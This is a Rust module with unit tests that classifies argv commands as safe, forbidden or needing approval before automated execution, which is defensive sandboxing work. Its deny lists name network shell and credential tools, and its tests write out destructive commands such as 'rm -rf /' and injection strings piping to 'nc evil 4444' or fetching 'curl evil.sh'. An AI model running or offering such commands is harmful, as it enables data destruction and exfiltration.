//! Deterministic command safety classification.
//!
//! Repository scripts, package manifests, issue text, and model output are
//! untrusted input. Before any automatic execution inside a run workspace,
//! every candidate command is classified in argv form — never via shell
//! parsing — into three deterministic classes:
//!
//! - [`CommandClass::Safe`]: recognized build/test/lint/format invocations.
//!   These still execute repository code (tests, build scripts, proc macros)
//!   inside the isolated workspace; "safe" means no publish/deploy/secrets/
//!   destructive intent was detected.
//! - [`CommandClass::Forbidden`]: publishing, deployment, cloud or
//!   infrastructure mutation, credential/wallet operations, destructive
//!   filesystem actions, shell indirection. Always refused.
//! - [`CommandClass::RequiresApproval`]: anything else. The run executor
//!   skips these and records the reason rather than guessing.

use serde::{Deserialize, Serialize};

/// Deterministic safety class for a candidate command.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CommandClass {
    /// Recognized build/test/lint/format command.
    Safe,
    /// Cannot be established safe; requires an explicit operator decision.
    RequiresApproval,
    /// Matches a forbidden capability class. Never executed.
    Forbidden,
}

impl CommandClass {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Safe => "safe",
            Self::RequiresApproval => "requires_approval",
            Self::Forbidden => "forbidden",
        }
    }
}

/// Classification result with an explainable reason.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CommandVerdict {
    pub class: CommandClass,
    pub reason: String,
}

impl CommandVerdict {
    fn safe(reason: impl Into<String>) -> Self {
        Self {
            class: CommandClass::Safe,
            reason: reason.into(),
        }
    }
    fn approval(reason: impl Into<String>) -> Self {
        Self {
            class: CommandClass::RequiresApproval,
            reason: reason.into(),
        }
    }
    fn forbidden(reason: impl Into<String>) -> Self {
        Self {
            class: CommandClass::Forbidden,
            reason: reason.into(),
        }
    }
}

/// Executable names that always indicate a forbidden capability class,
/// regardless of arguments.
const FORBIDDEN_PROGRAMS: &[&str] = &[
    // Shell indirection and eval — no argv inspection can make these safe.
    "sh",
    "bash",
    "zsh",
    "fish",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "eval",
    "exec",
    "cmd",
    "cmd.exe",
    "powershell",
    "powershell.exe",
    "pwsh",
    "pwsh.exe",
    // Privilege escalation and destructive filesystem operations.
    "sudo",
    "doas",
    "su",
    "rm",
    "rmdir",
    "del",
    "erase",
    "format",
    "mkfs",
    "dd",
    "shred",
    "wipe",
    "diskpart",
    "fdisk",
    "parted",
    // Cloud / infrastructure mutation planes.
    "terraform",
    "tofu",
    "pulumi",
    "ansible",
    "ansible-playbook",
    "kubectl",
    "helm",
    "kustomize",
    "aws",
    "gcloud",
    "az",
    "docker",
    "podman",
    "nerdctl",
    "flyctl",
    "fly",
    "serverless",
    "sls",
    "sam",
    "vercel",
    "netlify",
    "wrangler",
    "railway",
    "render",
    "heroku",
    "doctl",
    "vagrant",
    // Package / artifact publication and release.
    "twine",
    "flit",
    "poetry-publish",
    "gh",
    "hub",
    "release-it",
    "semantic-release",
    "changeset",
    "lerna",
    "nx",
    // Credential, key, wallet, and secret material.
    "ssh",
    "ssh-keygen",
    "ssh-agent",
    "scp",
    "sftp",
    "gpg",
    "openssl",
    "vault",
    "op",
    "sops",
    "age",
    "solana",
    "cast",
    "bitcoin-cli",
    "eth-cli",
    "secret-tool",
    "security",
    "keychain",
    // Network-wide tooling outside run scope.
    "nmap",
    "masscan",
    "nc",
    "ncat",
    "netcat",
    "socat",
    "telnet",
    "curl",
    "wget",
    "aria2c",
    "scp",
    // Database destruction / administration shells.
    "psql",
    "mysql",
    "mariadb",
    "mongo",
    "mongosh",
    "redis-cli",
    "sqlite3",
    "sqlcmd",
    "dropdb",
    "dropuser",
    // System mutation: package managers, services, power/session control.
    "apt",
    "apt-get",
    "aptitude",
    "dpkg",
    "dnf",
    "yum",
    "zypper",
    "pacman",
    "brew",
    "choco",
    "winget",
    "scoop",
    "snap",
    "flatpak",
    "pipx",
    "systemctl",
    "service",
    "launchctl",
    "shutdown",
    "reboot",
    "poweroff",
    "halt",
    "init",
    "loginctl",
    "useradd",
    "userdel",
    "usermod",
    "passwd",
    "chown",
    "chgrp",
    "mount",
    "umount",
    "swapon",
    "swapoff",
    "crontab",
    "at",
    "taskkill",
    "sc",
    "reg",
    "bcdedit",
    "diskpart",
];

/// Program name prefixes that are always forbidden (versioned filesystem
/// tools like `mkfs.ext4`, `wipefs`, `hdparm`).
const FORBIDDEN_PROGRAM_PREFIXES: &[&str] = &["mkfs", "wipefs", "hdparm", "nvme", "sg_"];

/// Program + first-argument pairs that are always forbidden even when the
/// program itself can run safe commands.
const FORBIDDEN_SUBCOMMANDS: &[(&str, &[&str])] = &[
    (
        "git",
        &["push", "remote", "config", "send-email", "request-pull"],
    ),
    (
        "npm",
        &[
            "publish",
            "adduser",
            "login",
            "logout",
            "token",
            "deprecate",
            "dist-tag",
            "owner",
            "access",
            "hook",
            "org",
            "team",
            "config",
        ],
    ),
    (
        "pnpm",
        &["publish", "login", "logout", "token", "config", "deploy"],
    ),
    ("yarn", &["publish", "login", "logout", "npm", "config"]),
    ("bun", &["publish", "pm"]),
    (
        "cargo",
        &["publish", "install", "login", "logout", "yank", "owner"],
    ),
    ("poetry", &["publish", "config", "self", "source"]),
    ("go", &["install", "generate", "mod", "get"]),
    ("mvn", &["deploy", "release"]),
    ("mvnw", &["deploy", "release"]),
    ("gradle", &["publish", "uploadArchives"]),
    ("gradlew", &["publish", "uploadArchives"]),
    ("make", &["install", "deploy", "publish", "release", "push"]),
    ("composer", &["global", "config", "exec"]),
    ("gem", &["push", "owner", "yank"]),
    ("dotnet", &["nuget", "tool"]),
    ("node", &["-e", "--eval", "-p", "--print"]),
    ("deno", &["install", "uninstall", "publish", "x"]),
    ("uv", &["publish"]),
    ("bundle", &["config"]),
    ("python", &["-c"]),
    ("python3", &["-c"]),
    ("py", &["-c"]),
];

/// Python `-m` modules that are recognized check/test runners.
const SAFE_PYTHON_MODULES: &[&str] = &[
    "pytest",
    "unittest",
    "compileall",
    "py_compile",
    "doctest",
    "coverage",
    "json.tool",
    "mypy",
    "ruff",
    "flake8",
    "black",
    "isort",
    "pylint",
];

/// Python `-m` modules that publish or upload artifacts.
const FORBIDDEN_PYTHON_MODULES: &[&str] = &["twine", "flit", "keyring"];

/// Script names for `npm|pnpm|yarn|bun run <script>` / `npm <script>` that
/// are recognized as standard build/test/lint invocations.
const SAFE_SCRIPT_NAMES: &[&str] = &[
    "test",
    "tests",
    "unit",
    "unit-test",
    "unit-tests",
    "spec",
    "check",
    "typecheck",
    "type-check",
    "tsc",
    "lint",
    "lint:check",
    "fmt",
    "format",
    "format:check",
    "build",
    "compile",
    "dev",
    "coverage",
    "ci",
    "verify",
    "clippy",
    "doc",
    "docs:build",
    "test:unit",
    "test:ci",
    "validate",
];

/// Standalone programs recognized as safe check/test runners.
const SAFE_PROGRAMS: &[&str] = &[
    "cargo",
    "rustc",
    "rustfmt",
    "pytest",
    "py.test",
    "python",
    "python3",
    "node",
    "deno",
    "go",
    "gofmt",
    "golint",
    "staticcheck",
    "javac",
    "java",
    "mvn",
    "mvnw",
    "gradle",
    "gradlew",
    "make",
    "cmake",
    "ctest",
    "ninja",
    "tsc",
    "eslint",
    "prettier",
    "biome",
    "jest",
    "vitest",
    "mocha",
    "ava",
    "ruff",
    "mypy",
    "pyright",
    "flake8",
    "black",
    "isort",
    "pylint",
    "rubocop",
    "rspec",
    "phpunit",
    "composer",
    "dotnet",
    "cspell",
    "shellcheck",
    "hadolint",
    "yamllint",
    "taplo",
    "git",
    "npx",
    "bunx",
    "true",
    "echo",
    "cat",
    "ls",
    "dir",
    "find",
    "grep",
    "rg",
];

/// Args that escalate privilege or widen sandbox permissions beyond the
/// workspace. Exact-token matching only — `-f`/`--force` are intentionally
/// excluded because they appear in legitimate build invocations and the
/// dangerous programs using them are already forbidden.
const DANGEROUS_ARG_TOKENS: &[&str] = &[
    "--unsafe",
    "--privileged",
    "--cap-add",
    "--network=host",
    "--net=host",
    "--allow-net",
    "--allow-read",
    "--allow-write",
    "--allow-run",
    "--allow-env",
    "--allow-ffi",
    "--allow-sys",
    "--allow-all",
    "--dangerously-skip-permissions",
    "--no-verify-ssl",
    "--insecure",
];

/// Classify an argv command deterministically.
///
/// The first element is the program (basename-compared, case-insensitive,
/// `.cmd`/`.exe`/`.bat` suffixes tolerated). No element is ever re-parsed
/// through a shell; metacharacters in arguments make the command require
/// approval rather than be reinterpreted.
pub fn classify_command(argv: &[String]) -> CommandVerdict {
    if argv.is_empty() {
        return CommandVerdict::forbidden("empty argv");
    }
    let program_raw = argv[0].trim();
    if program_raw.is_empty() {
        return CommandVerdict::forbidden("empty program name");
    }
    let program = program_basename(program_raw);

    // Arguments containing shell metacharacters, env assignments, or
    // redirection can hide a second command. Never reinterpret: require a
    // human decision instead.
    if argv.iter().skip(1).any(|arg| contains_shell_meta(arg)) {
        return CommandVerdict::approval(
            "argument contains shell metacharacters; refusing to reinterpret",
        );
    }
    if argv
        .iter()
        .skip(1)
        .any(|arg| arg.starts_with('-') && DANGEROUS_ARG_TOKENS.contains(&arg.as_str()))
    {
        return CommandVerdict::forbidden("argument requests destructive or privileged behavior");
    }

    if FORBIDDEN_PROGRAMS.contains(&program.as_str())
        || FORBIDDEN_PROGRAM_PREFIXES
            .iter()
            .any(|prefix| program.starts_with(prefix))
    {
        return CommandVerdict::forbidden(format!(
            "program '{program}' is a forbidden capability class"
        ));
    }

    // `env FOO=bar cmd` and `nice cmd` style wrappers shift argv.
    if matches!(
        program.as_str(),
        "env" | "nice" | "ionice" | "nohup" | "timeout" | "time" | "xargs" | "watch"
    ) {
        return CommandVerdict::approval(format!(
            "'{program}' wraps another command; execute the inner command directly"
        ));
    }

    let first_arg = argv.get(1).map(|s| s.as_str()).unwrap_or("");
    // Scan subcommand-position arguments: option flags (`git -c x push`,
    // `npm --prefix x publish`) must not smuggle a forbidden subcommand past
    // the check, while values of known value-taking options (`git -m push`)
    // are skipped to avoid false positives.
    for (prog, subs) in FORBIDDEN_SUBCOMMANDS {
        if program == *prog {
            for arg in subcommand_args(prog, argv) {
                if subs.contains(&arg) {
                    return CommandVerdict::forbidden(format!(
                        "'{program} {arg}' is a forbidden capability class"
                    ));
                }
            }
        }
    }

    // Path-escape attempts: arguments that climb out of the workspace.
    // A `..` path component (split on `/`, `\`, and `=` so `--opt=../x` is
    // caught) counts, as do POSIX absolute paths, UNC paths, and Windows
    // drive-letter paths. `..` embedded inside a component (`./...`,
    // `HEAD~1..HEAD`) is not an escape.
    if argv.iter().skip(1).any(|arg| {
        let a = arg.replace('\\', "/");
        a.split(['/', '=']).any(|component| component == "..")
            || a.starts_with('/')
            || (a.len() > 2 && a.as_bytes()[1] == b':' && a.as_bytes()[2] == b'/')
    }) {
        return CommandVerdict::approval("argument escapes the workspace root");
    }

    // `deno run -A` / `deno run --allow-all` widens the runtime sandbox.
    if program == "deno"
        && argv
            .iter()
            .skip(1)
            .any(|arg| arg == "-A" || arg.starts_with("--allow"))
    {
        return CommandVerdict::forbidden(
            "deno permission flags widen the sandbox beyond the workspace",
        );
    }

    // Python `-m <module>` dispatch: classify the module, not the interpreter.
    if matches!(program.as_str(), "python" | "python3" | "py") && first_arg == "-m" {
        return classify_python_module(argv);
    }

    // Package-runner scripts are safe only for recognized script names.
    if matches!(program.as_str(), "npm" | "pnpm" | "yarn" | "bun") {
        return classify_script_runner(&program, argv);
    }

    if SAFE_PROGRAMS.contains(&program.as_str()) {
        return CommandVerdict::safe(format!("'{program}' is a recognized build/test/lint tool"));
    }

    CommandVerdict::approval(format!("unrecognized program '{program}'"))
}

/// Options that consume the following argument as a value, per program.
/// Skipping their values keeps forbidden-subcommand scanning precise.
fn value_taking_options(program: &str) -> &'static [&'static str] {
    match program {
        "git" => &[
            "-m",
            "--message",
            "-F",
            "--file",
            "-C",
            "-c",
            "-u",
            "--untracked-files",
            "--git-dir",
            "--work-tree",
            "--author",
            "--date",
            "--template",
            "--reuse-message",
            "-t",
        ],
        "npm" | "pnpm" | "yarn" | "bun" => &[
            "-w",
            "--workspace",
            "--prefix",
            "--cache",
            "--registry",
            "--userconfig",
            "--globalconfig",
            "--cwd",
        ],
        "cargo" => &[
            "--manifest-path",
            "--package",
            "-p",
            "--bin",
            "--test",
            "--example",
            "--bench",
            "--target",
            "--target-dir",
            "--features",
            "--message-format",
            "--profile",
        ],
        "go" => &[
            "-C", "-o", "-p", "-mod", "-tags", "-ldflags", "-run", "-count",
        ],
        "python" | "python3" | "py" => &["-c", "-W", "-X", "--check-hash-based-pycs"],
        "node" => &[
            "-e",
            "--eval",
            "-p",
            "--print",
            "--require",
            "-r",
            "--loader",
            "--import",
        ],
        _ => &[],
    }
}

/// Iterate subcommand-position arguments: everything after the program name
/// except values of known value-taking options. The option flag itself is
/// still yielded — for `node`/`python` the flag can be the forbidden
/// subcommand (`-e`, `-c`).
fn subcommand_args<'a>(program: &str, argv: &'a [String]) -> Vec<&'a str> {
    let takers = value_taking_options(program);
    let mut out = Vec::new();
    let mut skip_next = false;
    for arg in argv.iter().skip(1) {
        if skip_next {
            skip_next = false;
            continue;
        }
        out.push(arg.as_str());
        if takers.contains(&arg.as_str()) {
            skip_next = true;
        }
    }
    out
}

/// `python -m <module>` — classify the module, never the bare interpreter.
fn classify_python_module(argv: &[String]) -> CommandVerdict {
    let module = argv.get(2).map(|s| s.as_str()).unwrap_or("");
    if module.is_empty() {
        return CommandVerdict::approval("python -m invoked without a module");
    }
    if FORBIDDEN_PYTHON_MODULES.contains(&module) {
        return CommandVerdict::forbidden(format!(
            "python -m {module} publishes or uploads artifacts"
        ));
    }
    if SAFE_PYTHON_MODULES.contains(&module) {
        return CommandVerdict::safe(format!("python -m {module} is a recognized check tool"));
    }
    // `pip`, `venv`, `build`, `installer`, and unknown modules mutate the
    // environment or fetch packages — never silently executed.
    CommandVerdict::approval(format!("unrecognized python module '{module}'"))
}

/// `git` is safe only for read/local subcommands inside the workspace.
fn classify_script_runner(program: &str, argv: &[String]) -> CommandVerdict {
    // npm test / npm t / npm run <script> / npm run-<script> forms.
    let sub = argv.get(1).map(|s| s.as_str()).unwrap_or("");
    let script = if sub == "run" || sub == "run-script" {
        argv.get(2).map(|s| s.as_str()).unwrap_or("")
    } else {
        sub
    };
    if script.is_empty() {
        return CommandVerdict::approval(format!("'{program}' invoked without a script"));
    }
    // install/ci/add fetch and execute dependency lifecycle scripts.
    if matches!(
        script,
        "install"
            | "ci"
            | "add"
            | "remove"
            | "update"
            | "upgrade"
            | "link"
            | "unlink"
            | "dlx"
            | "create"
            | "init"
            | "exec"
    ) {
        return CommandVerdict::approval(format!(
            "'{program} {script}' mutates dependencies and may execute lifecycle scripts"
        ));
    }
    if SAFE_SCRIPT_NAMES.contains(&script)
        || script.starts_with("test:")
        || script.starts_with("lint:")
        || script.starts_with("check")
    {
        return CommandVerdict::safe(format!("'{program} {script}' is a recognized check script"));
    }
    CommandVerdict::approval(format!("unrecognized script '{program} {script}'"))
}

/// Lowercased basename without `.exe`/`.cmd`/`.bat` suffix.
fn program_basename(raw: &str) -> String {
    let name = raw
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(raw)
        .to_ascii_lowercase();
    name.strip_suffix(".exe")
        .or_else(|| name.strip_suffix(".cmd"))
        .or_else(|| name.strip_suffix(".bat"))
        .unwrap_or(&name)
        .to_string()
}

/// Shell separators and substitutions that could hide a second command if
/// argv were ever re-parsed through a shell. Execution never uses a shell,
/// so these args would arrive literally — but flagging them prevents any
/// future caller from silently widening execution through re-parsing.
/// `=`, `~`, `*`, `?`, and bare `$` are NOT flagged: they are routine in
/// legitimate argv (env assignments, `HEAD~1`, globs, `$VAR` literals).
fn contains_shell_meta(arg: &str) -> bool {
    arg.contains([';', '|', '&', '>', '<', '`', '\n', '\r']) || arg.contains("$(")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn argv(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| s.to_string()).collect()
    }

    fn class(items: &[&str]) -> CommandClass {
        classify_command(&argv(items)).class
    }

    #[test]
    fn standard_build_and_test_commands_are_safe() {
        for cmd in [
            &["cargo", "test"][..],
            &["cargo", "clippy", "--", "-D", "warnings"][..],
            &["cargo", "fmt", "--check"][..],
            &["npm", "test"][..],
            &["npm", "run", "build"][..],
            &["pnpm", "run", "lint"][..],
            &["yarn", "test"][..],
            &["pytest", "tests/"][..],
            &["go", "test", "./..."][..],
            &["go", "vet", "./..."][..],
            &["make", "test"][..],
            &["./gradlew", "test"][..],
            &["mvn", "verify"][..],
            &["node", "--check", "index.js"][..],
            &["git", "status", "--porcelain"][..],
            &["git", "diff", "HEAD"][..],
            &["ruff", "check", "."][..],
            &["eslint", "src/"][..],
        ] {
            assert_eq!(class(cmd), CommandClass::Safe, "expected safe: {cmd:?}");
        }
    }

    #[test]
    fn publish_deploy_and_release_commands_are_forbidden() {
        for cmd in [
            &["npm", "publish"][..],
            &["cargo", "publish"][..],
            &["pnpm", "publish", "--access", "public"][..],
            &["yarn", "npm", "publish"][..],
            &["twine", "upload", "dist/*"][..],
            &["poetry", "publish"][..],
            &["mvn", "deploy"][..],
            &["./gradlew", "publish"][..],
            &["make", "deploy"][..],
            &["gh", "release", "create", "v1.0"][..],
            &["git", "push", "origin", "main"][..],
            &["vercel", "--prod"][..],
            &["wrangler", "deploy"][..],
            &["terraform", "apply"][..],
            &["kubectl", "apply", "-f", "pod.yaml"][..],
            &["helm", "install", "x"][..],
            &["flyctl", "deploy"][..],
        ] {
            assert_eq!(
                class(cmd),
                CommandClass::Forbidden,
                "expected forbidden: {cmd:?}"
            );
        }
    }

    #[test]
    fn destructive_and_credential_commands_are_forbidden() {
        for cmd in [
            &["rm", "-rf", "/"][..],
            &["rm", "file.txt"][..],
            &["dd", "if=/dev/zero", "of=/dev/sda"][..],
            &["mkfs.ext4", "/dev/sda1"][..],
            &["format", "C:"][..],
            &["sudo", "apt", "install", "x"][..],
            &["ssh-keygen", "-t", "ed25519"][..],
            &["aws", "s3", "rm", "s3://bucket"][..],
            &["gcloud", "auth", "login"][..],
            &["vault", "kv", "get", "secret/x"][..],
            &["solana", "transfer"][..],
            &["psql", "-c", "drop database x"][..],
            &["sqlite3", "db.sqlite", "delete"][..],
            &["nmap", "10.0.0.0/8"][..],
            &["curl", "https://x.sh"][..],
        ] {
            assert_eq!(
                class(cmd),
                CommandClass::Forbidden,
                "expected forbidden: {cmd:?}"
            );
        }
    }

    #[test]
    fn shell_indirection_is_always_forbidden() {
        for cmd in [
            &["sh", "-c", "cargo test"][..],
            &["bash", "script.sh"][..],
            &["cmd", "/c", "dir"][..],
            &["powershell", "-Command", "ls"][..],
            &["eval", "cargo test"][..],
        ] {
            assert_eq!(
                class(cmd),
                CommandClass::Forbidden,
                "expected forbidden: {cmd:?}"
            );
        }
    }

    #[test]
    fn metacharacters_and_escapes_require_approval() {
        for cmd in [
            &["cargo", "test", "&&", "rm", "-rf", "~"][..],
            &["npm", "test", ";", "curl", "evil.sh"][..],
            &["pytest", "|", "nc", "evil", "4444"][..],
            &["make", "test", ">", "/etc/passwd"][..],
            &["node", "script.js", "$(cat", "key)"][..],
            &["cargo", "test", "`id`"][..],
            &["npm", "test", "--prefix=../outside"][..],
        ] {
            assert_eq!(
                class(cmd),
                CommandClass::RequiresApproval,
                "expected approval: {cmd:?}"
            );
        }
    }

    #[test]
    fn unknown_and_dependency_mutating_commands_require_approval() {
        for cmd in [
            &["./scripts/setup.sh"][..],
            &["npm", "install"][..],
            &["npm", "ci"][..],
            &["pip", "install", "-r", "requirements.txt"][..],
            &["cargo", "install", "cargo-edit"][..],
            &["env", "FOO=1", "cargo", "test"][..],
            &["xargs", "rm"][..],
            &["npm", "run", "deploy"][..],
        ] {
            let verdict = classify_command(&argv(cmd));
            assert!(
                matches!(
                    verdict.class,
                    CommandClass::RequiresApproval | CommandClass::Forbidden
                ),
                "expected approval/forbidden: {cmd:?} got {verdict:?}"
            );
        }
        // `npm run deploy` is actually forbidden via FORBIDDEN_SUBCOMMANDS check order,
        // but RequiresApproval is also a safe outcome — assert it's never Safe.
        assert_ne!(class(&["npm", "run", "deploy"]), CommandClass::Safe);
    }

    #[test]
    fn windows_and_path_variants_normalize() {
        assert_eq!(class(&["C:\\tools\\cargo.exe", "test"]), CommandClass::Safe);
        assert_eq!(class(&["npm.cmd", "publish"]), CommandClass::Forbidden);
        assert_eq!(class(&["./gradlew", "publish"]), CommandClass::Forbidden);
        assert_eq!(class(&["RM.EXE", "-rf", "x"]), CommandClass::Forbidden);
    }

    #[test]
    fn git_subcommand_policy() {
        assert_eq!(class(&["git", "status"]), CommandClass::Safe);
        assert_eq!(class(&["git", "diff", "HEAD~1"]), CommandClass::Safe);
        assert_eq!(class(&["git", "log", "--oneline"]), CommandClass::Safe);
        assert_eq!(class(&["git", "add", "-A"]), CommandClass::Safe);
        assert_eq!(class(&["git", "checkout", "main"]), CommandClass::Safe);
        assert_eq!(class(&["git", "commit", "-m", "x"]), CommandClass::Safe);
        assert_eq!(class(&["git", "push"]), CommandClass::Forbidden);
        assert_eq!(
            class(&["git", "config", "user.email", "x"]),
            CommandClass::Forbidden
        );
        assert_eq!(
            class(&["git", "remote", "add", "evil", "url"]),
            CommandClass::Forbidden
        );
    }

    #[test]
    fn empty_argv_is_forbidden() {
        assert_eq!(classify_command(&[]).class, CommandClass::Forbidden);
        assert_eq!(class(&[""]), CommandClass::Forbidden);
    }
}
